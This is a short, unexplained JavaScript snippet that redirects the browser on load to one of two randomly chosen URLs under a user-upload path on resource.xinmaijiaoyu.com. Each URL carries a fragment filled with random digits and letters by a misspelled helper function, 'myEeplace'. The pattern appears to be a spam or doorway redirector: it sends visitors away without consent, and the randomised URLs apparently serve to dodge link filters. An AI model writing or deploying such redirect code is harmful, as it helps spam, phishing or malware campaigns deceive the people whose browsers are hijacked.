var urls=[
' https://resource.xinmaijiaoyu.com/user/2024043017554464955065.sb.com#{nnnnnnn}{wwww}',
' https://resource.xinmaijiaoyu.com/user/2024043018543720001524.sb.com#{nnnnnnn}{wwww}',];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
